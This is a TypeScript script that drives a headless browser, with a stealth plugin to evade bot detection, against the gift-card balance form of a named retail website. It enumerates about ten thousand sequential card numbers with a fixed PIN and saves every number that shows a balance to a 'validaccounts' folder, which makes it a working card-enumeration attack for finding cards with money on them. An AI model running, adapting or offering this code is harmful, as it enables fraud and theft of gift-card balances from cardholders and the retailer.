const puppeteer = require("puppeteer-extra");
const path = require("path");
const fs = require("fs");
const pkg = require("pkg");
const pincode = "000";

async function loginUser(options: any) {
  try {
    const StealthPlugin = require("puppeteer-extra-plugin-stealth");
    puppeteer.use(StealthPlugin());
    
    const browser = await puppeteer.launch({
      args: ["--start-maximized"],
      headless: true,
      defaultViewport: null
    });

    const page = await browser.newPage();

    await page.setDefaultNavigationTimeout(0);

    await page.goto("https://beertown.ca/gift-cards", {
      waitUntil: "load",
      timeout: 0,
      visible: true,
    });

    console.log("Tested account is", options.number);
    console.log("filling number input ..");
    await page.type("#loyalty-silverwave-form__card-number", options.number, {
      delay: 50,
    });

    console.log("filling code input ..");
    await page.type("#loyalty-silverwave-form__card-pin", pincode, {
      delay: 50,
    });

    console.log("submitting form .. ");
    await page.waitForSelector("button[type=submit]", {
      waitUntil: "load",
      timeout: 0,
      visible: true,
    });

    await page.evaluate(() => {
      let element: HTMLElement = document.querySelector(
        "button[type=submit]",
      ) as HTMLElement;

      if (element instanceof HTMLElement) {
        element.click();
      }
    });

    console.log("-------------------------------------------------------");

    let data;
    try {
      await page.waitForSelector(
        ".js-loyalty-silverwave-balance__card-balance",
        {
          waitUntil: "load",
          timeout: 30000,
          visible: true,
        },
      );
      data = await page.evaluate(() => {
        let element: HTMLElement = document.querySelector(
          ".js-loyalty-silverwave-balance__card-balance",
        ) as HTMLElement;
        if (element instanceof HTMLElement) {
          return element.innerText;
        }
      });

      let info = "Account = " + options.number + " has balance =" + data;

      console.log(info);

      fs.writeFileSync(
        `./validaccounts/acc-${options.number}.json`,
        JSON.stringify(info),
      );
    } catch (e) {
      console.log("Card not found");
    }

    console.log("-------------------------------------------------------");
    await browser.close();
  } catch (e) {
    console.log(e);
  }
}

let main = async () => {
  let num;
  for (let i = 19858; i <= 29858; i++) {
    let guess = String(i).padStart(6, "0");
    num = "0180700000" + guess;

    await Promise.all([
      loginUser({
        number: num,
      }),
    ]);
  }
};

main();
